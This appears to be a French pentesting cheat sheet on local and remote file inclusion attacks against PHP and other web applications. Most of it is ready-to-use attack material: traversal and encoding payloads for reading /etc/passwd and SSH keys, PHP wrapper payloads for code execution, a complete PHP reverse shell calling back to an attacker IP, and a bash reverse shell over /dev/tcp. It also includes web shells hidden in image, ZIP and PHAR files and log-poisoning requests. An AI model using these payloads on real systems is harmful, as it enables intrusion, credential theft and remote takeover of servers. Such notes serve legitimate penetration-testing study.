
- [[#Fonctions]]
- [[#Local File Inclusion LFI]]
- [[#Remote File Inclusion RFI]]
- [[#Log Poisoning]]
- [[#Automated Scanning]]


---
# Fonctions

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|`file_get_contents()`|✅|❌|✅|
|`fopen()`/`file()`|✅|❌|❌|
|**NodeJS**||||
|`fs.readFile()`|✅|❌|❌|
|`fs.sendFile()`|✅|❌|❌|
|`res.render()`|✅|✅|❌|
|**Java**||||
|`include`|✅|❌|❌|
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.Partial()`|✅|❌|❌|
|`@Html.RemotePartial()`|✅|❌|✅|
|`Response.WriteFile()`|✅|❌|❌|
|`include`|✅|✅|✅|

---
# Local File Inclusion #LFI


> [!TIP]
> Essayer d'inclure /etc/passwd pour avoir la liste d'utilisateurs, puis tenter d'inclure une clé privé SSH ! -> /home/user/.ssh/id_rsa

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#local-file-inclusion
## Basique

> [!TIP]
> Chercher paramètre qui pointe vers un autre fichier

```
C:\Windows\boot.ini
```

```
/etc/passwd
```

```
../../../../etc/passwd
```

```
/../../../../etc/passwd
```

NGINX ALIAS MISCONFIG

```
/dossier../
```

## Bypasses


```
....//....//....//....//etc/passwd
```

```
//....//....//....//....//etc/passwd
```

```
..///////..////..//////etc/passwd
```

```
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

### NULL Byte

```
../../../etc/passwd%00
```

### URL Encode

```
/etc/passwd

%2f%65%74%63%2f%70%61%73%73%77%64
```

```
../../../../etc/passwd

%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

```
../../../../etc/passwd%00

%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64%25%30%30
```

### URL Double Encode

```
../etc/passwd

%252e%252e%252fetc%252fpasswd
```

```
../../../../etc/passwd

%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
```

### UTF-8 Encoding

```
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

```
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```


### PATH TRUNCATION

Strings limités à 4096 charactères

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

```bash
echo -n "non_existing_directory/../../../etc/passwd" && for i in {1..2048}; do echo -n "."; done
```

```bash
echo -n "non_existing_directory/../../../etc/passwd" && for i in {1..2048}; do echo -n "\."; done
```

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "../"; done
```

```bash
echo -n "non_existing_directory/" &&
for i in {1..2048}; do echo -n "../"; done &&
echo -n "../../../etc/passwd/"
```

## Filtres PHP

> [!TIP]
> Lire code source des fichiers php

### PHP Wrappers

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md

```url
php://filter/read=convert.base64-encode/resource=config
```

```url
php://filter/read=string.rot13/resource=index.php
```

```url
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
```

#### Configs PHP

##### Apache
```url
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

##### NGINX

```url
php://filter/read=convert.base64-encode/resource=../../../../etc/php/X.Y/fpm/php.ini
```

Check du allow_url_include -> si "On" -> utiliser data ou include wrappers pour RCE ou possible de RFI

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

Check du expect -> si "extension=expect" -> utiliser expect wrappers pour RCE

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

## RCE

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md
### Data Wrapper

shell ?cmd=

```url
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=id
```

### Input Wrapper (POST Request)

```shell-session
php://input&cmd=id
```

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

### Expect Wrapper

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```


### SSH2 Wrapper

> [!TIP]
> Utile dans le cas ou un service ssh tourne en interne et des identifiants valides ont été récupérés pour un utilisateur.

```sh
curl -s 'http:///<SERVER_IP>:<PORT>/page.php?<parameter>=ssh2.exec://user:password@127.0.0.1/bash+-c+"bash+-i+>%26+/dev/tcp/<ip_attacker>/<port>+0>%261"%3b' -b "PHPSESSID=ptdmbs8go75rn235rhjn17u0ja"
```




---

# Remote File Inclusion #RFI

Tester d'inclure une url locale dans le paramètre (éviter d'inclure la page vulnérable pour éviter une boucle qui pourrait DOS)

```
http://127.0.0.1:80/autre_fichier.php
```

Tester d'inclure une url distante dans le paramètre -> https://app.interactsh.com/
ou serveur http monté à la volée

## RCE

> [!TIP]
> Tester plusieurs protocoles au cas ou certains ports seraient filtrés

### Reverse Shell

```BASH
echo '<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.7';
$port = 9001;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>' > revshell.php | 
sudo python3 -m http.server 8000
```

Tester plusieurs ports si listener ne reçoit rien (check ports ouverts sur la machine distante ?)

```
sudo nc -nvlp 445
```

```
language=http://OUR_IP:8000/revshell.php
```

### Web Shells
#### HTTP

```BASH
echo '<?php system($_GET["cmd"]); ?>' > shell.php | 
sudo python3 -m http.server 8000
```

```
language=http://OUR_IP:8000/shell.php&cmd=id
```

#### FTP

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php |
sudo python -m pyftpdlib -p 21
```

```
ftp://OUR_IP:21/shell.php&cmd=id
```

```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

#### SMB

```bash
impacket-smbserver -smb2support share $(pwd)
```

```
\\OUR_IP\share\shell.php&cmd=id
```





## FILE UPLOADS

### Image (récupérer URL en inspectant la page)

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

```url
./path/to/shell.gif&cmd=id
```

### ZIP

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

```url
zip://./path/to/shell.jpg%23shell.php&cmd=id
```

### PHAR

webshell.php

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```


compiler le fichier au format phar et le renommer en jpg

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

webshell

```url
param=phar://./path/to/shell.jpg%2fshell.txt&cmd=id
```

### ZIP Archive contenant un lien symbolic (Zip slip)

```bash
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```



# Log Poisoning

## COOKIE

C:\Windows\Temp\sess_COOKIE
/var/lib/php/sessions/sess_COOKIE

fichier de session renvoie-t-il un paramètre sous notre contrôle ?

```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_COOKIE
```

URL encoded Webshell

```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_COOKIE&cmd=id
```

## Server Logs

> [!TIP]
> access.log / error.log contiennent le User-Agent. Attention peut etre dangereux en prod car peut faire crasher l'application

> [!Apache]
>  
> /var/log/apache2/
> C:\xampp\apache\logs\

> [!NGINX]
> /var/log/nginx/
> C:\nginx\logs\

> [!Autres fichiers logs intéressants]
> - `/var/log/sshd.log`
> - `/var/log/mail`
> - `/var/log/vsftpd.log`
> /proc/self/environ
> /proc/self/fd/N ->  N = pid



Shell à mettre dans User-Agent:

```php
<?php system($_GET["cmd"]); ?>
```

ou requête curl:

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```


# Automated Scanning

## FUZZING des paramètres

Top 25 paramètres communs LFI
https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters

Fuzzing des paramètres commun avec ffuf 

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'
```

## FUZZING des LFI

fuzzing des LFI avec ffuf et la wordlist LFI-Jhaddix

```sh
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'
```

## FUZZING des fichiers de serveurs

Racine du serveur web

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php'
```

Logs/Configurations du serveur

https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

```sh
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ'
```